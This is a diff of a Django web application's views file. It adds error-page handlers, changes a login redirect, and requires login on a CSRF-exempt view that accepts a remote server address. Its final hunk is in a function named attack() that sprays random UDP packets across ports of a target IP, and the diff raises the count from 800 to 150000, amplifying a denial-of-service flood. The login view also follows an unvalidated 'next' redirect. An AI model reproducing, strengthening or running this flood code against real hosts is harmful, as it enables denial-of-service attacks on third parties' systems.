@@ -46,6 +46,14 @@ config={
 firebase=pyrebase.initialize_app(config)
 db=firebase.database()
 #https://www.youtube.com/watch?v=gsW5gYTNi34
+
+
+def error_404_view(request,exception):
+    return render_to_response('404.html')
+
+def error_505_view(request,exception):
+    return render_to_response('500.html')
+
 def login_view(request):
     next = request.GET.get('next')
     form = UserLoginForm(request.POST or None)
@@ -56,7 +64,7 @@ def login_view(request):
         login(request, user)
         if next:
             return redirect(next)
-        return redirect('/welcome')
+        return redirect('/select')
 
     context = {
         'form': form,
@@ -100,6 +108,7 @@ def normal(request):
 def index(request):
     return render_to_response('index.html')
 
+@login_required
 @csrf_exempt
 def external(request):
     remoteServer    = request.POST.get('param')
@@ -264,7 +273,7 @@ def attack(request):
     bytes = random._urandom(1490)
     sent = 0
     port=80
-    while sent<800:
+    while sent<150000:
         sock2.sendto(bytes, (remoteServerIP2,port))
         sent = sent + 1
         port = port + 1
